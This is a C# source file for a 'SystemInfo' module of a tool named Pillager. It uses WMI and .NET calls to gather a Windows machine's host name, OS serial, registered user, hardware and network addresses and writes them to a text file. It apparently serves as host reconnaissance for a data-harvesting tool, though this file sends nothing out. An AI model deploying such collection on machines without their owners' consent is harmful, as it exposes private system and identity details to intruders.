using Microsoft.VisualBasic.Devices;
using Pillager.Helper;
using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace Pillager.SystemInfos
{
    internal class SystemInfo : ICommandOnce
    {
        public string GetMessage()
        {
            StringBuilder sb = new StringBuilder();
            ComputerInfo computerInfo = new ComputerInfo();

            sb.AppendFormat("{0,-30}", "Host Name:");
            sb.AppendLine(Environment.MachineName);
            sb.AppendFormat("{0,-30}", "OS Name:");
            sb.AppendLine(computerInfo.OSFullName);

            using (ManagementObject wmi = new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get().Cast<ManagementObject>().First())
            {
                sb.AppendFormat("{0,-30}", "OS Version:");
                sb.AppendLine(wmi["Version"] + " Build " + wmi["BuildNumber"]);
                sb.AppendFormat("{0,-30}", "OS Architecture:");
                sb.AppendLine(wmi["OSArchitecture"].ToString());
                sb.AppendFormat("{0,-30}", "OS Language:");
                foreach (var item in (string[])wmi["MUILanguages"])
                {
                    sb.Append(item.ToString() + "|");
                }
                sb.Remove(sb.Length - 1, 1);
                sb.AppendLine();
                sb.AppendFormat("{0,-30}", "OS Architecture:");
                sb.AppendLine(wmi["OSArchitecture"].ToString());
                sb.AppendFormat("{0,-30}", "Install Date:");
                sb.AppendLine(wmi["InstallDate"].ToString());
                sb.AppendFormat("{0,-30}", "OS RegisteredUser:");
                sb.AppendLine(wmi["RegisteredUser"].ToString());
                sb.AppendFormat("{0,-30}", "Registered User:");
                sb.AppendLine(wmi["RegisteredUser"].ToString());
                sb.AppendFormat("{0,-30}", "Product Key:");
                sb.AppendLine(wmi["SerialNumber"].ToString());
                sb.AppendFormat("{0,-30}", "Windows Directory:");
                sb.AppendLine(wmi["WindowsDirectory"].ToString());
                sb.AppendFormat("{0,-30}", "System Directory:");
                sb.AppendLine(wmi["SystemDirectory"].ToString());
                sb.AppendFormat("{0,-30}", "Last Boot Up Time:");
                sb.AppendLine(wmi["LastBootUpTime"].ToString());

            }

            sb.AppendLine();
            try
            {
                using (ManagementObject Mobject = new ManagementClass("Win32_BIOS").GetInstances().OfType<ManagementObject>().FirstOrDefault())
                {
                    sb.AppendFormat("{0,-30}", "BIOS Version:");
                    sb.AppendLine((string)Mobject["Manufacturer"] + " " + (string)Mobject["SMBIOSBIOSVersion"] + " " + ManagementDateTimeConverter.ToDateTime((string)Mobject["ReleaseDate"]).ToString("yyyy/MM/dd"));
                }
                sb.AppendFormat("{0,-30}", "Bios Mode:");
                sb.AppendLine((Native.GetFirmwareType("", "{00000000-0000-0000-0000-000000000000}", IntPtr.Zero, 0) == 1) ? "BIOS" : "UEFI");
            }
            catch { }
            try
            {
                using (ManagementObjectCollection hardDiskC = new ManagementClass("Win32_ComputerSystemProduct").GetInstances())
                {
                    sb.AppendFormat("{0,-30}", "Computer Model:");
                    sb.AppendLine(hardDiskC.OfType<ManagementObject>().FirstOrDefault()["Name"].ToString());
                }
                sb.AppendFormat("{0,-30}", "Boot Mode:");
                sb.AppendLine(SystemInformation.BootMode.ToString());
            }
            catch { }

            sb.AppendLine();

            try
            {
                using (ManagementObjectSearcher mos = new ManagementObjectSearcher("Select * from Win32_Processor"))
                {
                    foreach (ManagementObject mo in mos.Get())
                    {
                        sb.AppendFormat("{0,-30}", "CPU Name:");
                        sb.AppendLine(mo["Name"].ToString());
                        sb.AppendFormat("{0,-30}", "");
                        sb.AppendLine("(" + mo["NumberOfCores"].ToString() + " Cores  " + mo["NumberOfLogicalProcessors"].ToString() + " Processors  VT " + ((bool)mo["VirtualizationFirmwareEnabled"] ? "Enable)" : "Disable)"));
                    }
                }
            }
            catch { }

            try
            {
                using (ManagementObjectSearcher Search = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    ManagementObject Mobject = Search.Get().OfType<ManagementObject>().FirstOrDefault();
                    sb.AppendFormat("{0,-30}", "RAM Size:");
                    sb.AppendLine((((Convert.ToDouble(Mobject["TotalPhysicalMemory"]) / 1073741824) > 1) ? Math.Ceiling(Convert.ToDouble(Mobject["TotalPhysicalMemory"]) / 1073741824).ToString() : (Convert.ToDouble(Mobject["TotalPhysicalMemory"]) / 1073741824).ToString()) + " GB");

                }
            }
            catch { }

            sb.AppendLine();
            try
            {

                DriveInfo[] allDrives = DriveInfo.GetDrives();
                sb.AppendFormat("{0,-30}", "DriveInfo:");
                sb.AppendLine();
                foreach (DriveInfo d in allDrives)
                {
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(d.Name);
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  Drive type..................: {0}", d.DriveType));
                    if (d.IsReady == true)
                    {
                        sb.AppendFormat("{0,-30}", "");
                        sb.AppendLine(string.Format("  Volume label................: {0}", d.VolumeLabel));
                        sb.AppendFormat("{0,-30}", "");
                        sb.AppendLine(string.Format("  File system.................: {0}", d.DriveFormat));
                        sb.AppendFormat("{0,-30}", "");
                        sb.AppendLine(string.Format("  Available space.............: {0} GB", d.TotalFreeSpace / 1024 / 1024 / 1024));
                        sb.AppendFormat("{0,-30}", "");
                        sb.AppendLine(string.Format("  Total size..................: {0} GB ", d.TotalSize / 1024 / 1024 / 1024));
                        sb.AppendLine();
                    }
                }

                sb.AppendLine();
            }
            catch { }

            try
            {
                ManagementObjectSearcher objvide = new ManagementObjectSearcher("select * from Win32_VideoController");
                sb.AppendFormat("{0,-30}", "VideoController:");
                sb.AppendLine();
                foreach (ManagementObject obj in objvide.Get())
                {
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("Name: " + obj["Name"]));
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("DriverVersion: " + obj["DriverVersion"]));
                    sb.AppendLine();
                }

                sb.AppendLine();
            }
            catch { }

            try
            {
                sb.AppendFormat("{0,-30}", "Interface:");

                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                if (nics == null || nics.Length < 1)
                {
                    sb.AppendLine("  No network interfaces found.");
                }
                else
                {
                    sb.AppendLine(string.Format("Number of interfaces .................... : {0}", nics.Length));
                }

                foreach (NetworkInterface adapter in nics)
                {
                    IPInterfaceProperties properties = adapter.GetIPProperties();
                    sb.AppendLine();
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(adapter.Description);
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(String.Empty.PadLeft(adapter.Description.Length, '='));
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  Interface type ........................ : {0}", adapter.NetworkInterfaceType));
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  Physical Address ...................... : {0}",
                               adapter.GetPhysicalAddress().ToString()));
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  Operational status .................... : {0}",
                        adapter.OperationalStatus));

                    string versions = "";
                    if (adapter.Supports(NetworkInterfaceComponent.IPv4))
                    {
                        versions = "IPv4 ";
                    }
                    if (adapter.Supports(NetworkInterfaceComponent.IPv6))
                    {
                        versions += "IPv6";
                    }
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  IP version ............................ : {0}", versions));

                    if (adapter.NetworkInterfaceType == NetworkInterfaceType.Loopback)
                    {
                        continue;
                    }
                    UnicastIPAddressInformationCollection UnicastIPAddressInformationCollection = properties.UnicastAddresses;
                    foreach (UnicastIPAddressInformation UnicastIPAddressInformation in UnicastIPAddressInformationCollection)
                    {
                        if (UnicastIPAddressInformation.Address.AddressFamily.ToString() == ProtocolFamily.InterNetwork.ToString())
                        {
                            sb.AppendFormat("{0,-30}", "");
                            sb.AppendLine("  IPV4 Address .......................... : " + UnicastIPAddressInformation.Address.ToString());
                        }

                    }
                    foreach (UnicastIPAddressInformation UnicastIPAddressInformation in UnicastIPAddressInformationCollection)
                    {
                        if (UnicastIPAddressInformation.Address.AddressFamily.ToString() == ProtocolFamily.InterNetworkV6.ToString())
                        {
                            sb.AppendFormat("{0,-30}", "");
                            sb.AppendLine("  IPV6 Address .......................... : " + UnicastIPAddressInformation.Address.ToString());
                        }

                    }
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  DNS suffix ............................ : {0}",
                        properties.DnsSuffix));

                    string label;
                    if (adapter.Supports(NetworkInterfaceComponent.IPv4))
                    {
                        IPv4InterfaceProperties ipv4 = properties.GetIPv4Properties();
                        sb.AppendFormat("{0,-30}", "");
                        sb.AppendLine(string.Format("  MTU.................................... : {0}", ipv4.Mtu));

                        sb.AppendFormat("{0,-30}", "");
                        sb.AppendLine(string.Format("  DHCP Enabled........................... : {0}", ipv4.IsDhcpEnabled));
                        if (ipv4.UsesWins)
                        {
                            IPAddressCollection winsServers = properties.WinsServersAddresses;
                            if (winsServers.Count > 0)
                            {
                                label = "  WINS Servers .......................... :";
                                sb.AppendFormat("{0,-30}", "");
                                sb.AppendLine(string.Format(label, winsServers));
                            }
                        }
                    }
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  DNS enabled ........................... : {0}",
                        properties.IsDnsEnabled));
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  Dynamically configured DNS ............ : {0}",
                        properties.IsDynamicDnsEnabled));
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  Receive Only .......................... : {0}",
                        adapter.IsReceiveOnly));
                    sb.AppendFormat("{0,-30}", "");
                    sb.AppendLine(string.Format("  Multicast ............................. : {0}",
                        adapter.SupportsMulticast));

                    sb.AppendLine();
                }
            }
            catch { }
            return sb.ToString();
        }
        public override void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, "System");
                string result = GetMessage();
                if (!string.IsNullOrEmpty(result))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "SystemInfo.txt"), result, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}
